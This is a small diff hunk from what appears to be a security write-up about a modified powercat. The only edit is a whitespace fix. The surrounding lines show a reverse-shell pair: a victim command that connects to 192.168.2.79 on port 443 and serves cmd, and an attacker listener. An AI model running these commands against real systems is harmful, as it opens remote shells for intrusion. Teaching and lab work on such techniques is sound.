@@ -45,7 +45,7 @@ With the modified powercat, let's try establishing a reverse shell and catch it 
 # victim
 powercat -c 192.168.2.79 443 -e cmd
 
-#attacker 
+#attacker
 powercat -l -p 443 -v
 ```
 
